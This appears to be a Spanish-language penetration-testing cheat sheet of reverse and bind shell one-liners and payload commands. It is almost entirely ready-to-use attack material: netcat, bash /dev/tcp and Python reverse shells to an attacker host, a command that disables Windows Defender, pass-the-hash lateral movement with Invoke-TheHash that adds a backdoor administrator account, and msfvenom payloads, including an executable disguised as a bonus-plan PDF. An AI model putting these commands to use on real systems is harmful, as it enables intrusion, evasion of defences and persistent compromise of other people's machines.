# Shells
## Reverse Shells

### Linux
#Maquina_victima 
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc [IP] [Puerto] >/tmp/f
```

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [IP] [Puerto]>/tmp/f
```

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [IP] [PUERTO] > /tmp/f
```

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(([IP],[PUERTO]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```
bash -c "sh -i >& /dev/tcp/[IP]/[PUERTO] 0>&1"
```

```
bash -i >& /dev/tcp/[IP]/[PUERTO] 0>&1
```

#Maquina_atacante 
```
nc -lvnp [PUERTO]
```

Si el firewall bloquea podemos usar el puerto 443 por ejemplo ya que este no suele estar bloqueado.
### Windows
#Maquina_victima_Windows 
```CMD
El bueno es de revshells el powershell#3 (Base64) con shell "powershell"
```
COMPROBAR POR QUE SE BORRO Y HE COGIDO UNA RANDOM

#Maquina_atacante 
```
sudo nc -lvnp [PUERTO]
```

Si el firewall bloquea podemos usar el puerto 443 por ejemplo ya que este no suele estar bloqueado.

Si estamos en una maquina Windows podemos desactivarlo con:
```PowerShell
Set-MpPreference -DisableRealtimeMonitoring $true
```
### Para una reverse entre windows
#PassTheHash #Stealth
Vamos a utilizar una técnica muy curiosa importando en powershell el modulo de "Invoke-TheHash" vamos a verlo. Todo esto es una manera un tanto compleja para poder hacer algo que podemos hacerlo más fácil pero para hacer menos ruido y por si desde nuestra kali no llegamos a esa red por algún bloqueo del firewall mola mucho.

	Requisitos

* Necesitamos el hash del usuario el cual este en "usuarios de gestión remota" o admin local en la maquina que queremos 
* Poder usar una powershell en una maquina del dominio
* Poder importar el modulo "Invoke-TheHash.psd1"
Poder importar nc.exe

Primero nos metemos en una powershell de cualquier manera que podemos y ejecutamos el flujo:
```powershell
powershell -ep bypass

Import-Module .\Invoke-TheHash.psd1
``` 
Con esto y teniendo movido los archivos nombrados anteriormente vamos a hacer el ataque en dos terminales separadas:
1:
```cmd
.\nc.exe -nlvp [PUERTO]
```

2:
```powershell
Invoke-WMIExec -Target [IP_O_NOMBRE_TARGET(ej:DC01)] -Domain [DOMINIO.LOCAL] -Username [USER_VICTIMA] -Hash [HASH_VICTIMA] -Command "[REVERSE SHELL#3 BASE64 DE REVSHELLS]"
```

Y con esto obtendríamos la shell en la máquina victima con la sesión del usuario que hemos robado

Invoke-TheHash tambien tiene cosas interesantes como el smbexec con el cual si somos admin podriamos hacer cosas como:
```PowerShell
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
Con esto creamos persistencia #Persistencia
### Metasploit

Para SMB tenemos el módulo `exploit/windows/smb/psexec`
## Bind Shells
Necesitas control total en ambas
#Maquina_victima 
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l [IP_VICTIMA] [PUERTO] > /tmp/f
```

#Maquina_atacante 
```
nc -nv [IP_VICTIMA] [PUERTO]
```

# Payloads

## En Ambos
[Payloads All The Things ](https://github.com/swisskyrepo/PayloadsAllTheThings)
## Linux con MsfVenom
El comando para crearlo es:
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=[IP_KALI] LPORT=[PUERTO] -f [EXTENSION_QUE_QUEREMOS] > [NOMBRE_FINAL].[EXTENSION]
```

Para saber el tipo de payloads:
```
msfvenom -l payloads
```

Ejemplo:
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

#Maquina_atacante 
```
nc -lvnp 443
```

#Maquina_victima 
Pasamos el archivo creado por MsfVenom y lo ejecutamos.

Ejemplo de una web Apache Tomcat:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.129.204.126 LPORT=443 -f war > shell.war
```

## Windows con MsfVenom
Ejemplo :
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.17.23.190 LPORT=1336 -f exe -o program.exe
```